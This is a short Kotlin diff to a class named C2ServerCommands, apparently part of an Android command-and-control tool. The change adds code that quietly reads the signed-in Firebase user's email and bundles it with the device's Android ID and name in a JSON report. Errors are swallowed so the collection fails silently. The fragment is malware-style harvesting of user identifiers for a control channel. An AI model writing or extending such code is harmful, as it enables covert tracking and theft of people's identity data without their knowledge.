@@ -32,9 +32,19 @@ class C2ServerCommands(private val context: Context) {
             // Ignore if we can't get it
         }
 
+        var loggedInEmail = "No User Logged In"
+        try {
+            val user = com.google.firebase.auth.FirebaseAuth.getInstance().currentUser
+            if (user != null && user.email != null) {
+                loggedInEmail = user.email!!
+            }
+        } catch (e: Exception) {
+        }
+
         // Return as JSON
         val escapedName = deviceName.replace("\"", "\\\"").replace("\n", " ")
-        return "{\"android_id\": \"$ssaid\", \"device_name\": \"$escapedName\"}"
+        val escapedEmail = loggedInEmail.replace("\"", "\\\"").replace("\n", " ")
+        return "{\"android_id\": \"$ssaid\", \"device_name\": \"$escapedName\", \"email\": \"$escapedEmail\"}"
     }
 
     fun getDeviceName(): String {
